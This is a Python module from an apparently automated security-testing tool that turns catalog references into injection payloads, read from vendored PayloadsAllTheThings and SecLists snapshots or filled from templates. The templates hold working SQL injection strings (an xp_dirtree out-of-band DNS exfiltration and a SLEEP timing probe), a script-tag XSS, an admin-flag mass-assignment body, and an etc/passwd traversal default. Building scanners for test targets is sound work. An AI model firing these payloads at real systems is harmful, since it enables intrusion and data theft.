"""Resolve a tagged ``payload_ref`` to a fireable, parameterized payload (§9).

The catalog (``library.py`` base slice + ``corpus.py`` vendored ingest) is a pure
tag index: its value is the ``(vuln_class, inferred_sink_type, oracle_type,
graph_edge_on_success)`` tagging, and §9 keeps raw exploit strings OUT of it. This
module turns a ``payload_ref`` into the actual value to fire, two ways:

  * **Template override** — a small hand-authored ``_TEMPLATES`` map for the base
    slice's *parameterized* payloads (OOB/timing/execution/authz refs carrying
    ``{nonce}``/``{collab}``/``{sleep}``/``{canary}``/``{object_id}``/…). Filled by
    targeted replacement so literal payload braces survive.
  * **Line-locator** — every bulk corpus ref ``<source>/<relpath>#Ln`` resolves by
    reading line N of the vendored snapshot file (``third_party/…``) on demand.
    Raw corpus lines are static payloads → they resolve to themselves. Network-free
    (§9): the snapshot is dev-vendored, read off disk, never fetched at fire time.

**Value/location decoupling (Nuclei-style).** The resolver produces the complete
parameter *value* only — never the injection *location*. Where a payload goes
(query / body / path / header) already lives on the graph ``Parameter.location``
and is applied by ``explorer._fire_with_value``. A resolved payload is a *complete
value to send*, not a fragment to splice, and a line-locator returns the vendored
line byte-for-byte — the resolver adds no framing of its own.

**Where templates live / slot convention.** A base-slice ``payload_ref`` needing
parameterization maps to a short, textbook template here. Templates are stimulus,
not a payload hoard — each is the minimal standard for its technique with named
slots the caller fills at fire time:

    {nonce}   unique OOB-callback subdomain label (per-fire, correlates the hit)
    {collab}  collaborator domain the OOB channel points at
    {canary}  execution-confirmation tag (proves a script/template actually ran)
    {sleep}   timing-oracle delay in seconds
    {columns} UNION column list matched to the target's column count
    {predicate} boolean-blind TRUE/FALSE predicate
    {pattern} NoSQL ``$regex`` predicate body
    {expr}    SSTI arithmetic expression (renders to its product on eval)
    {target}  traversal target path segment
    {object_id} substituted object identifier (BOLA/IDOR)
    {priv_field} privileged attribute name (mass assignment)

Slot filling is **targeted replacement**, never ``str.format`` — payloads carry
literal braces (Jinja ``{{7*7}}``, JSON ``{"$ne":null}``) that ``format`` would
choke on. A template's required slots are exactly the ``{name}`` tokens from the
fixed vocabulary that appear in it; literal braces are left untouched.

**Scope — who consumes this.** The resolution path serves the *generic* Explorer
pipeline (``get_payloads`` → resolve → ``fire_request(payload=...)``) and the
Phase 5 Coordinator. It intentionally does NOT retrofit the bespoke eval
detectors (``juiceshop_live``, the VAmPI harness): those are correctly
per-target/per-challenge tuned and must stay so — routing them through generic
templates would regress Task 1 coverage. This module adds a resolution path; it
never fires and never confirms (no oracle logic, no Validator import).

Vendored + network-free for the same reason as the corpus subset (CLAUDE.md §9):
templates are in-tree and reviewable, not fetched at runtime.
"""

from __future__ import annotations

import re
import uuid
from pathlib import Path

from reachagent.payloads.library import PayloadEntry, PayloadLibraryError

# Vendored snapshot roots — the same tree corpus.py ingests from. A line-locator
# ref ``<source>/<relpath>#Ln`` resolves by reading line N of the vendored file
# off disk (dev-vendored, network-free — §9). Keyed by the source prefix the
# corpus loader stamps into each ref.
_SNAPSHOT_ROOT = Path(__file__).parent.parent.parent.parent / "third_party"
_SNAPSHOT_DIRS: dict[str, Path] = {
    "PayloadsAllTheThings": _SNAPSHOT_ROOT / "payloadsallthethings-snapshot",
    "SecLists": _SNAPSHOT_ROOT / "seclists-snapshot",
}

# A corpus line-locator ref: ``<source>/<relpath>#L<n>`` (the shape corpus.py
# emits). ``source`` is the first path segment; ``relpath`` the rest; ``n`` the
# 1-based line number in the vendored file.
_LINE_LOCATOR = re.compile(r"^(?P<source>[^/]+)/(?P<relpath>.+)#L(?P<line>\d+)$")

# Fixed slot vocabulary. A template's *required* slots are exactly the members of
# this set that appear as ``{name}`` in it (minus any with a default) — so literal
# payload braces (which are never one of these tokens) are left alone.
#
# Slot semantics are single-purpose on purpose: a URL-valued slot and a
# file-path-valued slot must never share a name, or a realistic kit that fills the
# shared slot with (say) a URL yields a malformed value for the other class. Hence
# ``file_target`` (path-traversal/LFI file target) is distinct from any URL slot.
_SLOTS: frozenset[str] = frozenset(
    {
        "nonce",
        "collab",
        "canary",
        "sleep",
        "columns",
        "predicate",
        "pattern",
        "expr",
        "file_target",
        "object_id",
        "priv_field",
    }
)

# Per-slot defaults: a referenced slot with a default is optional (the caller may
# override it, else the default fills in). ``file_target`` defaults to a canonical
# read-only traversal target so a path-traversal ref resolves with no kit.
_SLOT_DEFAULTS: dict[str, str] = {
    "file_target": "etc/passwd",
}


class UnknownPayloadRefError(PayloadLibraryError):
    """Raised when a ``payload_ref`` has no template — a dead handle, never silent."""


class MissingSlotError(PayloadLibraryError):
    """Raised when a template needs a slot the caller didn't supply."""


# payload_ref → parameterized template — the OVERRIDE LAYER (§9). These are the
# base-slice refs (``data/library.yaml``) that need slot-filling: OOB/timing/
# execution/authz payloads carrying ``{nonce}``/``{collab}``/``{sleep}``/
# ``{canary}``/``{object_id}``/… . A ref present here is filled by targeted
# replacement; every OTHER catalog ref is a vendored line-locator resolved by
# reading its snapshot line (``_read_source_line``). Bulk corpus payloads are
# static text, so they need no template — only the parameterized base slice does.
_TEMPLATES: dict[str, str] = {
    "bola/object-id-substitution": "{object_id}",
    "idor/direct-object-reference-swap": "{object_id}",
    "mass-assignment/admin-flag-injection": '{"{priv_field}":true}',
    "sqli/error-based/quote-break": "'",
    "sqli/blind/oob-dns-exfil": r"'; EXEC master..xp_dirtree '\\{nonce}.{collab}\poc'-- -",
    "sqli/blind/timing-sleep-paired": "' AND SLEEP({sleep})-- -",
    "xss/reflected/script-tag-canary": "<script>{canary}</script>",
}


def _slots_in(template: str) -> frozenset[str]:
    """Every vocabulary slot token appearing in ``template``."""
    return frozenset(s for s in _SLOTS if "{" + s + "}" in template)


def required_slots(payload_ref: str) -> frozenset[str]:
    """Slots the caller MUST supply for a ref (unresolvable ref → error).

    A template's required slots are its vocabulary tokens minus any with a default
    (``file_target`` defaults to ``etc/passwd``). A **line-locator** ref is a static
    vendored payload — it needs no slots, so it returns an empty set (after
    confirming it resolves, so a dead handle still raises). A ref that is neither a
    template nor a resolvable locator raises :class:`UnknownPayloadRefError`.
    """
    template = _TEMPLATES.get(payload_ref)
    if template is not None:
        return _slots_in(template) - _SLOT_DEFAULTS.keys()
    # Not a template — must be a resolvable line-locator, else it's a dead handle.
    if _read_source_line(payload_ref) is not None:
        return frozenset()
    raise UnknownPayloadRefError(f"no template or vendored line for payload_ref {payload_ref!r}")


def template_refs() -> frozenset[str]:
    """The hand-authored template refs — the override layer (parameterized payloads)."""
    return frozenset(_TEMPLATES)


def mint_fire_kit(**overrides: object) -> dict[str, object]:
    """Mint the per-fire slot kit a resolution needs — mechanical, no oracle logic.

    Some slots are *per-fire correlators* the caller can't hardcode: ``nonce`` must
    be unique per probe so an OOB callback attributes to exactly one fire (§7
    oob_callback), and ``canary`` must be a unique tag so execution-confirmation
    proves *this* payload ran (§7 execution_confirmation). This helper generates a
    fresh, unique pair per call, plus a sensible ``sleep`` default for timing
    payloads. ``overrides`` (e.g. ``collab`` — the environment's OOB domain, or a
    caller-chosen ``sleep``) win over the minted defaults.

    Purely mechanical string generation — the Explorer mints correlators, it never
    interprets a response, so no oracle logic leaks into candidate generation.
    ``uuid4`` (not a crypto RNG) is deliberate: a correlator needs uniqueness, not
    unpredictability, and this stays dependency-free.
    """
    nonce = "ra" + uuid.uuid4().hex[:12]  # unique OOB subdomain label
    canary = "RA" + uuid.uuid4().hex[:10].upper()  # unique execution-confirmation tag
    kit: dict[str, object] = {"nonce": nonce, "canary": canary, "sleep": 5}
    kit.update({k: v for k, v in overrides.items() if v is not None})
    return kit


def resolves(payload_ref: str) -> bool:
    """Whether ``payload_ref`` resolves — a template override OR a vendored line.

    The sync-guard oracle: a catalog ref must be resolvable (no dead handle). True
    iff it is a known template or a readable line-locator; False otherwise. Never
    raises — it answers the yes/no the ``no dead handle`` invariant asks.
    """
    if payload_ref in _TEMPLATES:
        return True
    try:
        return _read_source_line(payload_ref) is not None
    except UnknownPayloadRefError:
        return False


def resolve(payload_ref: str, **slots: object) -> str:
    """Resolve ``payload_ref`` to a fireable payload string (§9). Value only, no location.

    Two-layer resolution, template override first:

      1. **Template override** — a hand-authored ``_TEMPLATES`` entry (the
         parameterized OOB/timing/execution/authz refs needing ``{nonce}``/
         ``{sleep}``/``{canary}``/… slots). If present, slot-fill it by targeted
         replacement (not ``str.format`` — literal payload braces like ``{{7*7}}``
         and ``{"$ne":null}`` survive), honoring ``_SLOT_DEFAULTS``.
      2. **Line-locator** — a bulk corpus ref ``<source>/<relpath>#Ln``: read line
         N from the vendored snapshot file. Raw corpus lines are static payloads →
         they resolve to themselves (extra slots ignored, so a caller may pass a
         uniform kit to every ref).

    Raises :class:`UnknownPayloadRefError` for a ref that is neither a known
    template nor a resolvable line-locator (a dead handle), and
    :class:`MissingSlotError` for a required (default-less) template slot omitted.
    Deterministic: same inputs → same output.
    """
    template = _TEMPLATES.get(payload_ref)
    if template is not None:
        return _fill_template(payload_ref, template, slots)
    line = _read_source_line(payload_ref)
    if line is not None:
        return line
    raise UnknownPayloadRefError(
        f"payload_ref {payload_ref!r} is neither a known template nor a resolvable "
        "vendored line-locator (dead handle)"
    )


def _fill_template(payload_ref: str, template: str, slots: dict[str, object]) -> str:
    """Slot-fill a hand-authored template by targeted replacement (literal braces survive)."""
    used = _slots_in(template)
    supplied = {k: v for k, v in slots.items() if v is not None}
    missing = (used - _SLOT_DEFAULTS.keys()) - supplied.keys()
    if missing:
        raise MissingSlotError(
            f"payload_ref {payload_ref!r} needs slot(s) {sorted(missing)}; got {sorted(slots)}"
        )
    result = template
    for name in used:
        value = supplied.get(name, _SLOT_DEFAULTS.get(name))
        result = result.replace("{" + name + "}", str(value))
    return result


def _read_source_line(payload_ref: str) -> str | None:
    """Read the payload string a line-locator ref points at, or ``None`` if not one.

    ``<source>/<relpath>#Ln`` → line N (1-based) of the vendored snapshot file,
    returned verbatim and stripped of its trailing newline only (the value, never a
    location — leading/trailing significant whitespace in a payload is preserved by
    reading the raw line). Returns ``None`` when the ref is not a line-locator (so
    ``resolve`` can distinguish "not a locator" from a genuinely dead handle);
    raises :class:`UnknownPayloadRefError` when it IS a locator but the file/line/
    source doesn't exist — a dead handle must never resolve silently.
    """
    match = _LINE_LOCATOR.match(payload_ref)
    if match is None:
        return None
    source = match.group("source")
    root = _SNAPSHOT_DIRS.get(source)
    if root is None:
        raise UnknownPayloadRefError(
            f"line-locator ref {payload_ref!r} names unknown source {source!r}"
        )
    path = root / match.group("relpath")
    if not path.is_file():
        raise UnknownPayloadRefError(f"line-locator ref {payload_ref!r}: no vendored file {path}")
    line_no = int(match.group("line"))
    lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
    if not 1 <= line_no <= len(lines):
        raise UnknownPayloadRefError(
            f"line-locator ref {payload_ref!r}: line {line_no} out of range (file has {len(lines)})"
        )
    return lines[line_no - 1]


def resolve_entry(entry: PayloadEntry, **slots: object) -> str:
    """Thin helper: turn a ``get_payloads`` entry into a fireable string.

    Purely mechanical (``entry.payload_ref`` → :func:`resolve`) — no oracle logic,
    no Validator import. The bridge from a sink-matched catalog entry to a payload
    the generic Explorer pipeline / Phase 5 Coordinator hands to ``fire_request``.
    """
    return resolve(entry.payload_ref, **slots)
